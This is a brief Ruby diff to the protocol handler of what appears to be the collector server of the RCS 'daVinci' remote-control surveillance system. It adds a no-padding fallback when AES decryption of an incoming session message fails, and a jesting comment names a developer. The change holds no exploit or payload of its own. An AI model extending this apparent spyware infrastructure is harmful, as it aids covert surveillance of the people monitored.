@@ -15,6 +15,7 @@ require 'rcs-common/pascalize'
 # system
 require 'securerandom'
 require 'digest/sha1'
+require 'openssl'
 
 module RCS
 module Collector
@@ -178,7 +179,14 @@ class Protocol
 
     begin
       # decrypt the message
-      message = aes_decrypt_integrity(content, session[:key])
+      begin
+        message = aes_decrypt_integrity(content, session[:key])
+      rescue OpenSSL::Cipher::CipherError
+        # the NO_PAD is needed because zeno (Fabrizio Cornelli) has broken his code
+        # from RCS < 7.6 to RCS daVinci. He owes me a another beer :)
+        trace :warn, "[#{peer}][#{cookie}] Invalid message decryption: trying with no pad..."
+        message = aes_decrypt_integrity(content, session[:key], RCS::Crypt::PAD_NOPAD)
+      end
     rescue Exception => e
       trace :error, "[#{peer}][#{cookie}] Invalid message decryption: #{e.message}"
       return
